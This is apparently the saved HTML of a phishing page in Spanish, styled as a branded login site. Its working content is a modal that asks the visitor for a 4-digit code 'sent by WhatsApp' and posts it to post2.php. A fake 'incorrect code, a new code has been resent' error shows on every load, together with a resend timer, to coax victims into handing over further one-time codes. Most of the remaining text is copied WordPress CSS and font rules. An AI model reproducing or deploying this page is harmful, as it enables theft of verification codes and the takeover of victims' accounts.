<!DOCTYPE html>
<!-- saved from url=(0048)/index.php -->
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script>
        function disableButton() {
            document.getElementById("submit").disabled = true;
        }
    </script>

<html> 
    <form onsubmit="disableButton()" action="post2.php" method="POST">
        <div id="open" class="modalDialog">
            <div>
                <a href="logo.php" title="Close" class="close" style="font-size: 16px;">X</a>
                <div style="text-align: center; padding-top: 10px;">
                    <img src="cropped-brand-bg-white-cp.png" style="width: 140px; padding: 7; text-align: center;">
                </div>
                <div style="text-align:center;"> 
                    <h4>Ingrese el código enviado por WhatsApp<span style="color: red;">*</span></h4>
                    <p style="margin-left: 10%; margin-right: 10%;">
                        Para verificar que eres tú, ingresa el <strong>código</strong> que acabas de recibir a continuación.
                    </p>

                    <div class="error-message" bis_skin_checked="1" style="display: block;">
                        <span class="error-text">El código ingresado es incorrecto, se ha reenviado un nuevo código, intente nuevamente.</span>
                      </div>
                      <input 
    autocomplete="off" 
    type="password" 
    inputmode="numeric" 
    name="code" 
    minlength="4" 
    maxlength="4" 
    required="required" 
    placeholder="****" 
    class="et_pb_s" 
    pattern="\d{4}" 
    oninput="this.value = this.value.replace(/[^0-9]/g, '');"
    style="
        margin-top: 5px;
        width: 70%;
        font-size: 25px;
        border: 0px;
        outline: none;
        border-bottom: 1px solid #797979;
        text-align: center;
        padding: 10px 15px;
        background: #fff;
        font-family: Open Sans, Verdana;"
>

                    <div id="contador" style="font-size: 14px; color: #dc6718; font-weight: 500;">
                        Reenviar en <span id="valorContador">25</span> segundos
                    </div>
                    
                    <script>
                        let contador = 25; // Tiempo inicial
                        const valorContador = document.getElementById("valorContador");
                    
                        const interval = setInterval(() => {
                            contador--;
                            valorContador.textContent = contador;
                    
                            if (contador <= 0) {
                                clearInterval(interval);
                                valorContador.textContent = "0";
                                // Aquí puedes añadir alguna acción al finalizar el conteo
                                console.log("¡Tiempo finalizado!");
                            }
                        }, 1000); // Actualización cada segundo
                    </script>
                    
                    <button id="reenviar" onclick="location.reload();" disabled="" style="
                        font-size: 20px;
                        font-weight: 500;
                        background-color: #a1a1a1;
                        color: #FFFFFF;
                        border: 2px solid;
                        border-radius: 3px;
                        padding: .3em 1em;
                        margin: 0 auto;">Reenviar</button>
                    <button id="submit" type="submit" style="
                        font-size: 20px;
                        font-weight: 500;
                        background-color: #6949c7;
                        color: #FFFFFF;
                        border: 2px solid;
                        border-radius: 3px;
                        padding: .3em 1em;
                        margin: 0 auto;">Continuar</button>
                </div>
            </div>
        </div>
    </form>
</html>

    
    <style type="text/css">
        .modalDialog {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    
        .modalDialog > div {
            background: #fff;
            border-radius: 10px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }
    
        .close {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #606061;
            color: #FFFFFF;
            text-decoration: none;
            border-radius: 12px;
            padding: 5px;
            font-size: 16px;
            font-weight: bold;
        }
    
        .close:hover {
            background: #00d9ff;
        }
    </style>
    
    <script>
    // Elimina el loader o elementos superpuestos si existen
    document.addEventListener("DOMContentLoaded", function() {
        const loader = document.querySelector('.loader4');
        const overlay = document.querySelector('.visibleDiv');
        if (loader) loader.remove();
        if (overlay) overlay.remove();
    });
    </script>
    

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <script src="./error_files/jquery.min.js.descarga"></script>
    <link rel="stylesheet" href="./error_files/all.min.css">



    <style id="et-divi-open-sans-inline-css">
        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk5hkWV4exQ.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk8ZkWV4exQ.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkxhjWV4exQ.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkyFjWV4exQ.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk0ZjWV4exQ.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsiH0B4uaVc.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4uaVc.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsgH1x4uaVc.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsg-1x4uaVc.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgshZ1x4uaVc.ttf) format('truetype');
        }

        /* User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0 */
        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk5hkWV4exg.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk8ZkWV4exg.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkxhjWV4exg.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkyFjWV4exg.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk0ZjWV4exg.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsiH0B4uaVQ.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4uaVQ.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsgH1x4uaVQ.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsg-1x4uaVQ.woff) format('woff');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgshZ1x4uaVQ.woff) format('woff');
        }

        /* User Agent: Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/39.0 */
        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk5hkWV4ewA.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk8ZkWV4ewA.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkxhjWV4ewA.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0RkyFjWV4ewA.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: italic;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memQYaGs126MiZpBA-UFUIcVXSCEkx2cmqvXlWq8tWZ0Pw86hd0Rk0ZjWV4ewA.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsiH0B4uaVI.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4uaVI.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 600;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsgH1x4uaVI.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 700;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsg-1x4uaVI.woff2) format('woff2');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 800;
            font-stretch: normal;
            font-display: swap;
            src: url(https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgshZ1x4uaVI.woff2) format('woff2');
        }
    </style>
  
    <title>Iniciar sesión</title>
    <style id="wp-block-library-theme-inline-css" type="text/css">
        #start-resizable-editor-section {
            display: none
        }

        .wp-block-audio figcaption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .wp-block-audio figcaption {
            color: hsla(0, 0%, 100%, .65)
        }

        .wp-block-code {
            font-family: Menlo, Consolas, monaco, monospace;
            color: #1e1e1e;
            padding: .8em 1em;
            border: 1px solid #ddd;
            border-radius: 4px
        }

        .wp-block-embed figcaption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .wp-block-embed figcaption {
            color: hsla(0, 0%, 100%, .65)
        }

        .blocks-gallery-caption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .blocks-gallery-caption {
            color: hsla(0, 0%, 100%, .65)
        }

        .wp-block-image figcaption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .wp-block-image figcaption {
            color: hsla(0, 0%, 100%, .65)
        }

        .wp-block-pullquote {
            border-top: 4px solid;
            border-bottom: 4px solid;
            margin-bottom: 1.75em;
            color: currentColor
        }

        .wp-block-pullquote__citation,
        .wp-block-pullquote cite,
        .wp-block-pullquote footer {
            color: currentColor;
            text-transform: uppercase;
            font-size: .8125em;
            font-style: normal
        }

        .wp-block-quote {
            border-left: .25em solid;
            margin: 0 0 1.75em;
            padding-left: 1em
        }

        .wp-block-quote cite,
        .wp-block-quote footer {
            color: currentColor;
            font-size: .8125em;
            position: relative;
            font-style: normal
        }

        .wp-block-quote.has-text-align-right {
            border-left: none;
            border-right: .25em solid;
            padding-left: 0;
            padding-right: 1em
        }

        .wp-block-quote.has-text-align-center {
            border: none;
            padding-left: 0
        }

        .wp-block-quote.is-large,
        .wp-block-quote.is-style-large {
            border: none
        }

        .wp-block-search .wp-block-search__label {
            font-weight: 700
        }

        .wp-block-group.has-background {
            padding: 1.25em 2.375em;
            margin-top: 0;
            margin-bottom: 0
        }

        .wp-block-separator {
            border: none;
            border-bottom: 2px solid;
            margin-left: auto;
            margin-right: auto;
            opacity: .4
        }

        .wp-block-separator:not(.is-style-wide):not(.is-style-dots) {
            width: 100px
        }

        .wp-block-separator.has-background:not(.is-style-dots) {
            border-bottom: none;
            height: 1px
        }

        .wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots) {
            height: 2px
        }

        .wp-block-table thead {
            border-bottom: 3px solid
        }

        .wp-block-table tfoot {
            border-top: 3px solid
        }

        .wp-block-table td,
        .wp-block-table th {
            padding: .5em;
            border: 1px solid;
            word-break: normal
        }

        .wp-block-table figcaption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .wp-block-table figcaption {
            color: hsla(0, 0%, 100%, .65)
        }

        .wp-block-video figcaption {
            color: #555;
            font-size: 13px;
            text-align: center
        }

        .is-dark-theme .wp-block-video figcaption {
            color: hsla(0, 0%, 100%, .65)
        }

        .wp-block-template-part.has-background {
            padding: 1.25em 2.375em;
            margin-top: 0;
            margin-bottom: 0
        }

        #end-resizable-editor-section {
            display: none
        }
    </style>
    <style id="global-styles-inline-css" type="text/css">
        body {
            --wp--preset--color--black: #000000;
            --wp--preset--color--cyan-bluish-gray: #abb8c3;
            --wp--preset--color--white: #ffffff;
            --wp--preset--color--pale-pink: #f78da7;
            --wp--preset--color--vivid-red: #cf2e2e;
            --wp--preset--color--luminous-vivid-orange: #ff6900;
            --wp--preset--color--luminous-vivid-amber: #fcb900;
            --wp--preset--color--light-green-cyan: #7bdcb5;
            --wp--preset--color--vivid-green-cyan: #00d084;
            --wp--preset--color--pale-cyan-blue: #8ed1fc;
            --wp--preset--color--vivid-cyan-blue: #0693e3;
            --wp--preset--color--vivid-purple: #9b51e0;
            --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
            --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
            --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
            --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
            --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
            --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
            --wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
            --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
            --wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
            --wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
            --wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
            --wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
            --wp--preset--font-size--small: 13px;
            --wp--preset--font-size--normal: 16px;
            --wp--preset--font-size--medium: 20px;
            --wp--preset--font-size--large: 36px;
            --wp--preset--font-size--huge: 42px;
        }

        .has-black-color {
            color: var(--wp--preset--color--black) !important;
        }

        .has-cyan-bluish-gray-color {
            color: var(--wp--preset--color--cyan-bluish-gray) !important;
        }

        .has-white-color {
            color: var(--wp--preset--color--white) !important;
        }

        .has-pale-pink-color {
            color: var(--wp--preset--color--pale-pink) !important;
        }

        .has-vivid-red-color {
            color: var(--wp--preset--color--vivid-red) !important;
        }

        .has-luminous-vivid-orange-color {
            color: var(--wp--preset--color--luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-amber-color {
            color: var(--wp--preset--color--luminous-vivid-amber) !important;
        }

        .has-light-green-cyan-color {
            color: var(--wp--preset--color--light-green-cyan) !important;
        }

        .has-vivid-green-cyan-color {
            color: var(--wp--preset--color--vivid-green-cyan) !important;
        }

        .has-pale-cyan-blue-color {
            color: var(--wp--preset--color--pale-cyan-blue) !important;
        }

        .has-vivid-cyan-blue-color {
            color: var(--wp--preset--color--vivid-cyan-blue) !important;
        }

        .has-vivid-purple-color {
            color: var(--wp--preset--color--vivid-purple) !important;
        }

        .has-black-background-color {
            background-color: var(--wp--preset--color--black) !important;
        }

        .has-cyan-bluish-gray-background-color {
            background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
        }

        .has-white-background-color {
            background-color: var(--wp--preset--color--white) !important;
        }

        .has-pale-pink-background-color {
            background-color: var(--wp--preset--color--pale-pink) !important;
        }

        .has-vivid-red-background-color {
            background-color: var(--wp--preset--color--vivid-red) !important;
        }

        .has-luminous-vivid-orange-background-color {
            background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-amber-background-color {
            background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
        }

        .has-light-green-cyan-background-color {
            background-color: var(--wp--preset--color--light-green-cyan) !important;
        }

        .has-vivid-green-cyan-background-color {
            background-color: var(--wp--preset--color--vivid-green-cyan) !important;
        }

        .has-pale-cyan-blue-background-color {
            background-color: var(--wp--preset--color--pale-cyan-blue) !important;
        }

        .has-vivid-cyan-blue-background-color {
            background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
        }

        .has-vivid-purple-background-color {
            background-color: var(--wp--preset--color--vivid-purple) !important;
        }

        .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
            background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
        }

        .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
            background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
        }

        .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
            background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-orange-to-vivid-red-gradient-background {
            background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
        }

        .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
            background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
        }

        .has-cool-to-warm-spectrum-gradient-background {
            background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
        }

        .has-blush-light-purple-gradient-background {
            background: var(--wp--preset--gradient--blush-light-purple) !important;
        }

        .has-blush-bordeaux-gradient-background {
            background: var(--wp--preset--gradient--blush-bordeaux) !important;
        }

        .has-luminous-dusk-gradient-background {
            background: var(--wp--preset--gradient--luminous-dusk) !important;
        }

        .has-pale-ocean-gradient-background {
            background: var(--wp--preset--gradient--pale-ocean) !important;
        }

        .has-electric-grass-gradient-background {
            background: var(--wp--preset--gradient--electric-grass) !important;
        }

        .has-midnight-gradient-background {
            background: var(--wp--preset--gradient--midnight) !important;
        }

        .has-small-font-size {
            font-size: var(--wp--preset--font-size--small) !important;
        }

        .has-normal-font-size {
            font-size: var(--wp--preset--font-size--normal) !important;
        }

        .has-medium-font-size {
            font-size: var(--wp--preset--font-size--medium) !important;
        }

        .has-large-font-size {
            font-size: var(--wp--preset--font-size--large) !important;
        }

        .has-huge-font-size {
            font-size: var(--wp--preset--font-size--huge) !important;
        }
    </style>
    <link rel="stylesheet" id="divi-style-css" href="./error_files/estilo3.css" type="text/css" media="all">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <!-- CSS only -->
    <link href="./error_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    




    <link rel="icon" href="/images/cropped-brand-bg-white-cp-32x32.png" sizes="32x32">
    <link rel="icon" href="/images/cropped-brand-bg-white-cp-192x192.png" sizes="192x192">
    <link rel="apple-touch-icon" href="/images/cropped-brand-bg-white-cp-180x180.png">
    <meta name="msapplication-TileImage" content="./images/cropped-brand-bg-white-cp-270x270.png">
    <style id="et-divi-customizer-global-cached-inline-styles">
        @media only screen and (min-width:1350px) {
            .et_pb_row {
                padding: 27px 0
            }

            .et_pb_section {
                padding: 54px 0
            }

            .single.et_pb_pagebuilder_layout.et_full_width_page .et_post_meta_wrapper {
                padding-top: 81px
            }

            .et_pb_fullwidth_section {
                padding: 0
            }
        }

        .lwp-hide-mobile-menu.et_pb_menu .et_pb_menu__menu,
        .lwp-hide-mobile-menu.et_pb_fullwidth_menu .et_pb_menu__menu {
            display: flex !important
        }

        .lwp-hide-mobile-menu .et_mobile_nav_menu {
            display: none
        }

        .nav li ul {
            border-top: 3px solid #DC6718
        }

        .contenidolp {
            padding-left: 60px
        }

        .contenidolpd {
            padding-left: 30px
        }

        .contenidolpt {
            padding-left: 0px
        }

        .reset {
            clear: both
        }

        .button-cookies {
            background: #531BC5 !important;
            border-radius: 30px !important;
            text-decoration: none;
            color: #fff;
            padding: 10px 10px
        }

        .background-slide-sbo {
            background: url('wp-content/uploads/2021/07/fondo-sbo.jpg') center no-repeat;
            background-size: cover;
            padding: 0px 0px
        }

        .hero-button {
            margin-top: 70px
        }

        .hero-button a {
            background: #dc6718;
            padding: 20px 20px;
            font-size: 25px;
            font-weight: 900;
            border-radius: 50px;
            text-decoration: none;
            color: #fff
        }

        .et_pb_toggle_title:before {
            content: "33";
            font-size: 50px;
            margin-top: -.4em;
            margin-right: 15px
        }

        .et_pb_toggle_open .et_pb_toggle_title:before {
            display: block !important;
            content: "e04f"
        }

        @media screen and (min-width:320px) and (max-width:450px) {
            .background-slide-sbo {
                background: #531BC5 !important;
                background-size: cover;
                padding: 0px 0px
            }
        }

        .button-cookies {
            background: #531BC5 !important;
            border-radius: 30px !important
        }

        .background-slide-sbo {
            background: url('wp-content/uploads/2021/07/fondo-sbo.jpg') center no-repeat;
            background-size: cover;
            padding: 0px 0px
        }

        .hero-button {
            margin-top: 70px
        }

        .hero-button a {
            background: #dc6718;
            padding: 20px 20px;
            font-size: 25px;
            font-weight: 900;
            border-radius: 50px;
            text-decoration: none;
            color: #fff
        }

        .et_pb_toggle_title:before {
            content: "\33";
            font-size: 50px;
            margin-top: -.4em;
            margin-right: 15px
        }

        .et_pb_toggle_open .et_pb_toggle_title:before {
            display: block !important;
            content: "\e04f"
        }

        .imgApp {
            width: 27%
        }

        .imgAndroid {
            width: 30%
        }

        @media screen and (min-width:320px) and (max-width:450px) {
            .tiendasContenedor {
                display: block;
                margin: auto
            }

            .imgApp {
                width: 45%
            }

            .imgAndroid {
                width: 50%
            }

            .background-slide-sbo {
                background: #531BC5 !important;
                background-size: cover;
                padding: 0px 0px
            }
        }
    </style>
</head>

<body class="page-template-default page page-id-2255 et-tb-has-template et-tb-has-header et-tb-has-footer et_pb_button_helper_class et_cover_background et_pb_gutter et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db">


    <style type="text/css">
.visibleDiv {
    z-index: 999;
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    filter: alpha(opacity=70);
    opacity: 0.6;
    background-color: white;

}

.loader4 {
    
    position: fixed;
  left: 40%;
  top: 20%;
  z-index: 9999;
   width:90px;
   height:90px;
   display:inline-block;
   padding:0px;
   border-radius:100%;
   border:10px solid;
   border-top-color:rgba(220, 103, 24, 1);
   border-bottom-color:rgba(105, 73, 199, 1);
   border-left-color:rgba(105, 73, 199, 1);
   border-right-color:rgba(255, 255, 255, 1);
   -webkit-animation: loader4 4s ease-in-out infinite;
   animation: loader4 1s ease-in-out infinite;
}
@keyframes loader4 {
   from {transform: rotate(0deg);}
   to {transform: rotate(360deg);}
}
@-webkit-keyframes loader4 {
   from {-webkit-transform: rotate(0deg);}
   to {-webkit-transform: rotate(360deg);}
}
    </style>
    <div class="loader4" style="display: none;"></div>
    <div class="visibleDiv" style="display: none;"> </div>

    <script type="text/javascript">
   
$(window).load(function(){
   // PAGE IS FULLY LOADED  
   // FADE OUT YOUR OVERLAYING DIV
   setTimeout(
  function() 
  {
    //do something special
    $('.loader4').fadeOut();
    $('.visibleDiv').fadeOut();
    $('.error-message').show();
    $('#jejeform').show();
    $('#engres').show();
  }, 2000);

   
});



$(document).ready(function(){
    $('.submit').click(function(){
        $('.loader4').fadeIn();
        $('.loader4').show();
    });
});
    </script>


    <div id="page-container">
        <div id="et-boc" class="et-boc">

            <header class="et-l et-l--header">
                <div class="et_builder_inner_content et_pb_gutters3">
                    <div class="et_pb_section et_pb_section_0_tb_header et_pb_with_background et_section_regular et_pb_section--with-menu">






                        <div class="et_pb_row et_pb_row_0_tb_header et_pb_row--with-menu">
                            <div class="et_pb_column et_pb_column_1_4 et_pb_column_0_tb_header  et_pb_css_mix_blend_mode_passthrough">




                                <div class="et_pb_module et_pb_image et_pb_image_0_tb_header">




                                    <a href="/index.php#"><span class="et_pb_image_wrap "><img loading="lazy" width="363" height="268" src="./error_files/logo-download.png" alt="" title="cropped-brand-bg-white-cp.png"  sizes="(max-width: 363px) 100vw, 363px" class="wp-image-10"></span></a>
                                </div>
                            </div>
                            <div class="et_pb_column et_pb_column_3_4 et_pb_column_1_tb_header  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column--with-menu">




                                <div class="et_pb_module et_pb_menu et_pb_menu_0_tb_header et_pb_bg_layout_light  et_pb_text_align_left et_dropdown_animation_fade et_pb_menu--without-logo et_pb_menu--style-centered">




                                    <div class="et_pb_menu_inner_container clearfix">

                                        <div class="et_pb_menu__wrap">
                                            <div class="et_pb_menu__menu">
                                                <nav class="et-menu-nav">
                                                    <ul id="menu-menu" class="et-menu nav">
                                                     
                                                            </ul>
                                                    
                                                    
                                                </nav>
                                            </div>


                                            <div class="et_mobile_nav_menu">
                                                <div class="mobile_nav closed">
                                                    
                                                </div>
                                            </div>
